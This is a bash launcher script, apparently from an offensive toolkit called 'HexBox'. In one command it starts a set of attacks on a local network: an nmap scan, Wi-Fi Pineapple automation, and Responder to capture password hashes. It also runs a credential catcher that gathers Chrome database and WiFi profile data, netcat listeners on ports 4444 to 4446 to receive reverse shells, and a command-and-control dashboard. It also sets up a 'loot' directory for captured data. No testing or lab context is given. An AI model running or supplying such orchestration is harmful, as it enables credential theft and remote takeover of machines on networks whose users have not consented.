#!/bin/bash
# ~/hexbox/scripts/engage.sh — The "go loud" button
# Usage: bash engage.sh [target-network]
#   target-network defaults to 192.168.1.0/24

set -euo pipefail

TARGET_NET=${1:-192.168.1.0/24}
HEXBOX_DIR="$(cd "$(dirname "$0")/.." && pwd)"
WIRED_IF=$(HEXBOX_CONFIG="$HEXBOX_DIR/config.json" python3 -c "import json,os; c=json.load(open(os.environ['HEXBOX_CONFIG'])); print(c.get('interfaces',{}).get('responder','eth0'))" 2>/dev/null || echo eth0)
LOOT="$HEXBOX_DIR/loot/engagement_$(date +%s)"
LOGS="$HEXBOX_DIR/logs"
PID_FILE="$LOGS/engage.pids"

mkdir -p "$LOOT" "$LOGS"
> "$PID_FILE"

# ---- Graceful shutdown on Ctrl-C / exit ----
cleanup() {
    echo ""
    echo "[!] Disengaging — stopping all services..."
    while IFS=' ' read -r pid name; do
        if kill -0 "$pid" 2>/dev/null; then
            kill "$pid" 2>/dev/null && echo "  [stopped] $name (pid=$pid)"
        fi
    done < "$PID_FILE"
    rm -f "$PID_FILE"
    echo "[+] All services stopped."
}
trap cleanup EXIT INT TERM

track() { echo "$1 $2" >> "$PID_FILE"; }

echo "[*] HexBox engaging against $TARGET_NET"
echo "[*] Loot dir : $LOOT"
echo ""

# 1. Nmap recon from Pi
nmap -sS -sV -T4 -oA "$LOOT/recon" "$TARGET_NET" > "$LOOT/nmap.log" 2>&1 &
track $! "nmap"
echo "[+] nmap recon started"

# 2. Pineapple automation
python3 "$HEXBOX_DIR/scripts/pineapple_auto.py" > "$LOOT/pineapple.log" 2>&1 &
track $! "pineapple_auto"
echo "[+] pineapple automation started"

# 3. Responder (hash capture)
responder -I "$WIRED_IF" -wrf > "$LOOT/responder.log" 2>&1 &
track $! "responder"
echo "[+] responder started on interface $WIRED_IF"

# 4. Credential catcher (Chrome DB, WiFi profiles)
python3 "$HEXBOX_DIR/c2/catcher.py" > "$LOOT/catcher.log" 2>&1 &
track $! "catcher"
echo "[+] catcher started on port 8000"

# 5. Reverse shell listeners
for port in 4444 4445 4446; do
    nc -lvnp "$port" > "$LOOT/shell_${port}.log" 2>&1 &
    track $! "nc-$port"
done
echo "[+] nc listeners on 4444 4445 4446"

# 6. C2 dashboard — poll until it responds
python3 "$HEXBOX_DIR/c2/hexbox_c2.py" > "$LOOT/c2.log" 2>&1 &
track $! "hexbox_c2"

echo "[*] Waiting for C2 dashboard to come up..."
for i in $(seq 1 20); do
    if curl -sf "http://127.0.0.1:1337/" > /dev/null 2>&1; then
        break
    fi
    sleep 1
done

MY_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
echo ""
echo "[+] =================================================="
echo "[+]  HexBox ENGAGED"
echo "[+]  Dashboard : http://${MY_IP}:1337"
echo "[+]  Catcher   : http://${MY_IP}:8000"
echo "[+]  Loot      : $LOOT"
echo "[+] =================================================="
echo ""
echo "[*] Press Ctrl+C to disengage all services"
echo ""

wait
